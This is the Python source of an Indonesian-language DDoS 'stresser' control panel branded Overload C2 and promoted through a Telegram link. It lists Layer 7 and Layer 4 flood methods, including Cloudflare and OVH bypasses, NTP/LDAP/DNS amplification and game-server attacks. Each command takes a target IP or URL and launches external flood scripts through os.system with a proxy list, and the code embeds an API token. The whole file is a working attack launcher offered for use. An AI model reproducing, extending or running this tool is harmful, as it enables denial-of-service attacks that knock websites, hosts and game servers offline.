import socket
import builtins
import os
import requests
import random
import getpass
import time
import sys
import math
import subprocess
import threading
import json
import urllib.parse
import string
from datetime import datetime, timedelta
import pytz
from termcolor import colored
from rich import print
from rich.table import Table
from tabulate import tabulate
from colorama import init, Fore, Back, Style  
    
proxys = open('proxies.txt').readlines()
bots = len(proxys)

def clear_screen():
    os.system('cls'if os.name == 'nt'else'clear')

init() 
                           
def get_ip_info(token, ip=None):
    ip_url = f"https://ipinfo.io/{ip}?token={token}"
    response = requests.get(ip_url)

    if response.ok:
        data = response.json()
        simple_data = {
            "ASN": data.get("asn"),
            "Organisasi": data.get("org"),
            "ISP": data.get("isp"),
            "IP": data.get("ip")
        }
        print("[bold yellow]Informasi IP[/bold yellow]")
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Detail")
        table.add_column("Informasi")
        for key, value in simple_data.items():
            if value:
                table.add_row(key, value)
        print(table)
        return data
    else:
        print(f"[bold red]Error saat mengambil info IP untuk {ip}:[/bold red] {response.text}")
        return None

def get_url_info(url, token):
    parsed_url = urllib.parse.urlparse(url)
    hostname = parsed_url.netloc
    api_endpoint = f"https://host.io/api/web/{hostname}?token={token}"
    response_hostio = requests.get(api_endpoint)

    if response_hostio.status_code == 200:
        data_hostio = response_hostio.json()
        ip_address = data_hostio.get("ip") # Asumsi ada kunci 'ip'

        if ip_address:
            ip_url_ipinfo = f"https://ipinfo.io/{ip_address}?token={token}"
            response_ipinfo = requests.get(ip_url_ipinfo)
            if response_ipinfo.ok:
                data_ipinfo = response_ipinfo.json()
                simple_data = {
                    "ASN": data_ipinfo.get("asn"),
                    "Organisasi": data_ipinfo.get("org"),
                    "ISP": data_ipinfo.get("isp"),
                    "IP": data_ipinfo.get("ip")
                }
                print(f"[bold yellow]Informasi URL untuk {url}[/bold yellow]")
                table = Table(show_header=True, header_style="bold magenta")
                table.add_column("Detail")
                table.add_column("Informasi")
                for key, value in simple_data.items():
                    if value:
                        table.add_row(key, value)
                print(table)
                return simple_data
            else:
                print(f"[bold red]Error saat mengambil info IP untuk {ip_address}:[/bold red] {response_ipinfo.text}")
                return None
        else:
            print(f"[yellow]Tidak dapat menemukan alamat IP untuk {url}.[/yellow]")
            return None
    else:
        print(f"[bold red]Error saat mengambil informasi URL untuk {url}:[/bold red] {response_hostio.text}")
        return None
                                                                                                                                                                                                                                                                                   
def si(): 
    print('         [ https://t.me/+VP7cK9_P7jE4ZjBl ] | Welcome to Stresser Panel | Owner: @OverloadServer | Update v5.0')
    print("")                

def layer7():
    clear_screen()
    si() # Memanggil fungsi si()
    print("--------------------------------------------------")
    print("                LAYER 7 METHODS                   ")
    print("--------------------------------------------------")
    print("➤ HTTPBYPASS    : HIGHREQ BYPASS CLOUDFLARE 99% ")
    print("➤ CFGAS          : LOWREQ HTTP1 BYPASS CLOUDFLARE 99%")
    print("➤ HTTP-STORM    : HIGHREQ BYPASS CLOUDFLARE 95%")
    print("➤ TLSV1           : NO PROTECT")
    print("➤ TLSV2           : NO PROTECT")
    print("➤ CF-BYPASS      : LOWREQ HTTP1 BYPASS CLOUDFLARE 99%")
    print("➤ CF-FLOOD       : BYPASS CLOUDFLARE & AMAZON & AKAMAI 99%")
    print("➤ HTTPGET        : BYPASS CLOUDFLARE 60%")
    print("➤ CRASH          : NO PROTECT")
    print("➤ HTTPFLOOD     : NO PROTECT")
    print("➤ H2-UAM         : NO PROXY LOWREQ BYPASS UAM & CAPTCHA 99%")
    print("➤ H2-HOLD        :  BYPASS CLOUDFLARE 99%")
    print("➤ H2-BYPASS      : BYPASS CLOUDFLARE 30%")    
    print("➤ SLOW           : NO PROTECT")
    print("➤ HTTPS-SPOOF   : NO PROTECT KHUSUS SPOOF SSL")
    print("--------------------------------------------------")

# Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.

def layer4():
    clear_screen()
    si() # Memanggil fungsi si()
    print("--------------------------------------------------")
    print("                LAYER 4 METHODS                   ")
    print("--------------------------------------------------")
    print("➤ UDP          : UDP FLOOD")
    print("➤ TCP          : TCP MIX FLOOD")
    print("➤ NFO-KILLER   : NFOSERVER ATTACK")
    print("➤ STD          : UDP&TCPSYN&ICMP MIX")
    print("➤ UDPBYPASS    : BYPASS UDP PROTECT")
    print("➤ DESTROY      : UDP FLOOD")
    print("➤ HOME         : UDP FLOOD")
    print("➤ GOD          : UDP FLOOD")
    print("➤ SLOWLORIS    : TCP SLOW")
    print("➤ FLUX         : TCP SYN")
    print("➤ STDV2        : TCP FLOOD")
    print("➤ OVH-RAW      : TCP BYPASS OVH")
    print("➤ OVH-BEAM     : TCP BYPASS OVH")
    print("➤ OVERFLOW     : UDP DNS FLOOD")
    print("➤ OVH-AMP      : UDP MIX DNS&NTP")
    print("➤ MINECRAFT    : TCP ATTACK GAME SERVER")
    print("➤ SAMP         : TCP&UDP MIX ATTACK GTASA MULTIPLAYER ")
    print("➤ LDAP         : UDP AMP FLOOD")
    print("--------------------------------------------------")

# Catatan: Pastikan fungsi `clear_screen()` dan `si()` sudah terdefinisi di bagian lain kode Anda.

def usage():
    clear_screen()
    si() # Memanggil fungsi si()
    print("--------------------------------------------------")
    print("        USAGE METODE LAYER 7 & LAYER 4         ")
    print("--------------------------------------------------")

    print("\n--- METODE LAYER 7 ---")
    print("➤ HTTPBYPASS    : HTTPBYPASS https://target.com 60")
    print("➤ CFGAS         : CFGAS https://target.com 60")
    print("➤ HTTP-STORM    : HTTP-STORM https://target.com 60")
    print("➤ TLSV1           : TLSV1 https://target.com 60")
    print("➤ TLSV2           : TLSV2 https://target.com 60")
    print("➤ CF-BYPASS     : CF-BYPASS https://target.com 60")
    print("➤ CF-FLOOD       : CF-FLOOD https://target.com 60")
    print("➤ HTTPGET       : HTTPGET https://target.com 60")
    print("➤ CRASH         : CRASH https://target.com GET")
    print("➤ HTTPFLOOD     : HTTPFLOOD https://target.com 15000 get 60")
    print("➤ H2-UAM        : H2-UAM https://target.com 60")
    print("➤ H2-HOLD       : H2-HOLD https://target.com 60")
    print("➤ H2-BYPASS    : H2-BYPASS https://target.com 60")
    print("➤ SLOW          : SLOW https://target.com 60")
    print("➤ HTTPS-SPOOF   : HTTPS-SPOOF https://target.com 60")

    print("\n--- METODE LAYER 4 ---")
    print("➤ UDP          : UDP 1.1.1.1 port")
    print("➤ TCP          : TCP GET/POST/HEAD 1.1.1.1 port 60 8500")
    print("➤ NFO-KILLER   : NFO-KILLER 1.1.1.1 port 850 60")
    print("➤ STD          : STD 1.1.1.1 port")
    print("➤ UDPBYPASS    : UDPBYPASS 1.1.1.1 port")
    print("➤ DESTROY      : DESTROY 1.1.1.1 port 60")
    print("➤ HOME         : HOME 1.1.1.1 port 65500 60")
    print("➤ GOD          : GOD 1.1.1.1 port 60")
    print("➤ SLOWLORIS    : SLOWLORIS 1.1.1.1 port")
    print("➤ FLUX         : FLUX 1.1.1.1 port 250")
    print("➤ STDV2        : STDV2 1.1.1.1 port")
    print("➤ OVH-RAW      : OVH-RAW GET 1.1.1.1 port 60 8500")
    print("➤ OVH-BEAM     : OVH-BEAM GET 1.1.1.1 port 60")
    print("➤ OVERFLOW     : OVERFLOW 1.1.1.1 port 5000")
    print("➤ OVH-AMP      : OVH-AMP 1.1.1.1 port")
    print("➤ MINECRAFT    : MINECRAFT 1.1.1.1 5000 500 60")
    print("➤ SAMP         : SAMP 1.1.1.1 7777")
    print("➤ LDAP         : LDAP 1.1.1.1 port 650 60")
    print("--------------------------------------------------")

# Konstanta untuk Interval Pemindaian (20 menit dalam detik)
SCAN_INTERVAL = 20 * 60 

# Variabel Global (Akan diubah oleh thread pemindaian)
proxys = []
bots = 0

def clear_screen():
    # Fungsi untuk membersihkan layar
    # Tetap gunakan os.system, namun jika ini juga bermasalah,
    # Anda harus menonaktifkannya dan hanya mencetak baris kosong.
    os.system('cls' if os.name == 'nt' else 'clear')

def scan_proxies():
    """Membaca ulang file proxies.txt dan mengupdate variabel global bots."""
    global proxys, bots # Mendeklarasikan bahwa kita akan memodifikasi variabel global
    
    try:
        # Menggunakan 'with open' memastikan file ditutup dengan benar
        with open('proxies.txt', 'r') as f:
            new_proxys = f.readlines()
        
        # Update variabel global
        proxys = new_proxys
        bots = len(proxys)
        
        # print(f"✅ Pemindaian berhasil: Total bots terupdate menjadi {bots}") # Opsional: Untuk debug
        
    except FileNotFoundError:
        proxys = []
        bots = 0
        print(f"\n[{time.strftime('%H:%M:%S')}] ⚠️ Peringatan: File 'proxies.txt' tidak ditemukan. Bot diatur ke 0.")

    # Jadwalkan pemindaian berikutnya
    # Setelah pemindaian selesai, setel timer untuk menjalankan fungsi ini lagi
    timer = threading.Timer(SCAN_INTERVAL, scan_proxies)
    timer.daemon = True # Membuat thread ini mati ketika program utama mati
    timer.start()

# ----------------------------------------------------
# INISIALISASI & FUNGSI MENU
# ----------------------------------------------------

# 1. Jalankan pemindaian pertama kali saat program dimulai
scan_proxies() 

box_content_width = 66
# --------------------------

def get_vps_uptime():
    """
    Mengambil uptime VPS secara realtime menggunakan perintah 'uptime -p' di Linux.
    Mengembalikan string seperti 'up 5 hours, 12 minutes'.
    """
    try:
        # Menjalankan perintah 'uptime -p' dan menangkap output
        result = subprocess.run(['uptime', '-p'], capture_output=True, text=True, check=True)
        # Menghilangkan 'up ' dari hasil dan membersihkan whitespace
        uptime_str = result.stdout.strip().replace('up ', '', 1)
        return uptime_str
    except (subprocess.CalledProcessError, FileNotFoundError):
        # Jika perintah gagal (misalnya, bukan Linux), kembalikan nilai default
        return "N/A"

def get_logged_in_users():
    """
    Mengambil jumlah pengguna yang login secara realtime menggunakan perintah 'who | wc -l'.
    Mengembalikan integer jumlah pengguna.
    """
    try:
        # Menjalankan perintah 'who'
        who_result = subprocess.run(['who'], capture_output=True, text=True, check=True)
        # Menghitung baris (setiap baris adalah pengguna yang login)
        login_count = len(who_result.stdout.strip().split('\n'))
        
        # Penanganan kasus jika tidak ada yang login (split('\n') akan menghasilkan 1 elemen kosong)
        if who_result.stdout.strip() == "":
            return 0
            
        return login_count
    except (subprocess.CalledProcessError, FileNotFoundError):
        # Jika perintah gagal, kembalikan nilai default
        return "N/A"

def get_expiry_date():
    """
    Menghitung tanggal kedaluwarsa 30 hari dari sekarang (REALTIME).
    """
    expiry_date = datetime.now() + timedelta(days=30)
    return expiry_date.strftime("%d-%m-%Y")

def menu():
    clear_screen()
    
    # Ambil data realtime
    uptime = get_vps_uptime()
    logged_users = get_logged_in_users()
    expiry_date = get_expiry_date()

    # Gabungkan semua data ke dalam string judul
    title_string = (
        f"OnlineBot: [{bots}] | User : root | VIP (true) | "
        f"Uptime: {uptime} | Logins: {logged_users} | "
        f"Expired: {expiry_date} (30DAY)"
    )

    # Menggunakan OSC 2 (\x1b]2;) untuk mengatur judul jendela.
    sys.stdout.write(f"\x1b]2;{title_string}\x07")
    sys.stdout.flush()
    
    # Pesan informasi awal (Teks polos)
    header_text = ' [ https://t.me/+VP7cK9_P7jE4ZjBl ] | Welcome to Stresser Panel | Owner: @OverloadServer | Update v5.0 '
    print(header_text)
    print("")

    # Seni ASCII (Logo) - HANYA Teks Polos
    ansi_art_lines = """
                                           .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   "t.me/OverloadServer"   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
                            O V E R L O A D   C 2
"""
    
    print(ansi_art_lines)
    print("")

    # --- Fungsi Bantuan Banner (Menggunakan Karakter ASCII Dasar) ---
    
    # Fungsi bantu untuk menggambar garis border atas 
    def draw_top_border(width):
        # Mengganti ╔, ═, ╗ menjadi +, -, +
        return f"+{'-' * width}+"

    # Fungsi bantu untuk menggambar garis border bawah 
    def draw_bottom_border(width):
        # Mengganti ╚, ═, ╝ menjadi +, -, +
        return f"+{'-' * width}+"

    # Fungsi bantu untuk baris tengah
    def draw_middle_line(text, width, align='center', **kwargs):
        if align == 'center':
            padded_text = text.center(width)
        elif align == 'left':
            padded_text = text.ljust(width)
            
        # Mengganti ║ menjadi |
        return f"|{padded_text}|"

    # --- Banner Selamat Datang ---
    print(draw_top_border(box_content_width)) 
    print(draw_middle_line("WELCOME TO OVERLOAD CONTROL PANEL", box_content_width, 'center')) 
    print(draw_middle_line(" - - - Copyright 2024-2027 - - - ", box_content_width, 'center')) 
    print(draw_bottom_border(box_content_width))

    print("") 

    # --- Banner Telegram ---
    print(draw_top_border(box_content_width))
    print(draw_middle_line(">>> https://t.me/+VP7cK9_P7jE4ZjBl <<<", box_content_width, 'center')) 
    print(draw_bottom_border(box_content_width))

    print("") 

    # --- Banner Menu Utama ---
    print(draw_top_border(box_content_width))
    print(draw_middle_line("LAYER7  ➤ SHOW LAYER7 FOR ATTACK DOMAIN", box_content_width, 'left')) 
    print(draw_middle_line("LAYER4  ➤ SHOW LAYER4 FOR ATTACK IP", box_content_width, 'left')) 
    print(draw_middle_line("USAGE   ➤ SHOW EXAMPLE USAGE PANEL", box_content_width, 'left'))
    print(draw_middle_line("CLEAR   ➤ CLEAR TERMINAL", box_content_width, 'left')) 
    print(draw_bottom_border(box_content_width))

def main():
    menu() # Memanggil fungsi menu untuk menampilkan tampilan awal
    while(True):        
        # Prompt untuk input pengguna
        print('\033[ROOT\033] \033►\033[KOMINFO] ', end='')
        cnc = input().strip() # Menggunakan .strip() untuk menghapus spasi di awal/akhir
        print("Anda memasukkan:", cnc)
        
        # Normalisasi input ke huruf kecil untuk perbandingan yang lebih mudah dan case-insensitive
        command_lower = cnc.lower()

        if command_lower in ["layer7", "l7"]: # Kondisi disederhanakan
            layer7()
        elif command_lower in ["layer4", "l4"]: # Kondisi disederhanakan
            layer4()
        elif command_lower in ["clear", "cls"]: # Kondisi disederhanakan
            clear_screen() # Panggil clear_screen() untuk membersihkan terminal
            menu() # Tampilkan kembali menu setelah membersihkan layar
        elif command_lower == "usage": # Kondisi disederhanakan, hapus redundansi
            usage() 
    
# LAYER 4 METHODS   

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBYPASS {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)    
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: udpbypass <ip> <port>')
                print('Example: udpbypass 1.1.1.1 80')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./std {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: stdv2 <ip> <port>')
                print('Example: stdv2 1.1.1.1 80')

        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} 250 0')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: slowloris <ip> <port>')
                print('Example: slowloris 1.1.1.1 80')

        elif "god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl god.pl {ip} {port} 65500 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: god <ip> <port> <time>')
                print('Example: god 1.1.1.1 80 60')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} 65500 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: home <ip> <port> <packet_size> <time>')
                print('Example: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./nfo-killer {ip} {port} 850 -1 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} 8500')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} 8500')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')
                
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
                
        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {port} {thread}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: overflow <ip> <port> <threads>')
                print('Example: overflow 1.1.1.1 80 5000')
               
        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ldap {ip} {port} 650 -1 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./MINECRAFT-SLAM {ip} 5000 500 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./OVH-AMP {ip} {port}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ovh-amp <ip> <port>')
                print('Example: ovh-amp 1.1.1.1 80')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ntp {ip} {port} ntp.txt 250 {time}')
                token = "727e8c2fa5b07c"
                ip = f"{ip}"
                info = get_ip_info(token, ip)
                print(info)
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')     
                
# LAYER 7 METHODS
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python3 https-spoof.py {url} {time} 32')
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://vailon.com 60 500')     
                
        elif "h2-uam" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]               
                os.system(f'python3 h2-uam.py {url} {time}')
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
            except IndexError:
                print('Usage: h2-uam <url> <time>')
                print('Example: h2-uam https://lol.com 60')                             
        
        elif "slow" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node slow.js {url} {time}')          
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result)             
                
               sys.stdout.write(f"\x1b]2;{title_string}\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: slow
               Ketik [CLS] untuk membersihkan terminal""")
                          
            except IndexError:
                print('Penggunaan: slow <url> <waktu>')
                print('Contoh: slow http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
                
        elif "cf-flood" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node cf-flood.js {url} {time} 3 32 proxies.txt')          
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result)             
                
               sys.stdout.write(f"\x1b]2;{title_string}\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: cf-flood
               Ketik [CLS] untuk membersihkan terminal""")
                          
            except IndexError:
                print('Penggunaan: cf-flood <url> <waktu>')
                print('Contoh: cf-flood http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")        
                
        elif "h2-hold" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node h2-holdv2.js {url} {time} 3 32 proxies.txt')     
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result)             
                
               sys.stdout.write(f"\x1b]2;{title_string}\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: h2-hold
               Ketik [CLS] untuk membersihkan terminal""")
                          
            except IndexError:
                print('Penggunaan: h2-hold <url> <waktu>')
                print('Contoh: h2-hold http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
    
        elif "h2-bypass" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node h2-bypass.js POST {url} {time} 3 32 proxies.txt --randrate true --debug true')          
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result)             
                
               sys.stdout.write(f"\x1b]2;{title_string}\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: h2-bypass
               Ketik [CLS] untuk membersihkan terminal""")
                          
            except IndexError:
                print('Penggunaan: h2-bypass <url> <waktu>')
                print('Contoh: h2-bypass http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
        
        elif "cfgas" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
                             
               os.system(f'node cfgas.js {url} {time} 3 32 proxies.txt')
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2;{title_string}\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: cfgas
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: cfgas <url> <waktu>')
                print('Contoh: cfgas http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")

        elif "httpbypass" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
                
               os.system(f'node h2-holdv2.js {url} {time} 16 32 proxies.txt')     
               
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2;{title_string}\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: httpbypass
               Ketik [CLS] untuk membersihkan terminal""")  
                        
            except IndexError:
                print('Penggunaan: httpbypass <url> <waktu>')
                print('Contoh: httpbypass http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 

        elif "tlsv1" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
                               
               os.system(f'node httpbypassv2.js {url} {time} 3 32 proxies.txt')        
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2;{title_string}\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: tlsv1
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: tlsv1 <url> <waktu>')
                print('Contoh: tlsv1 http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
                
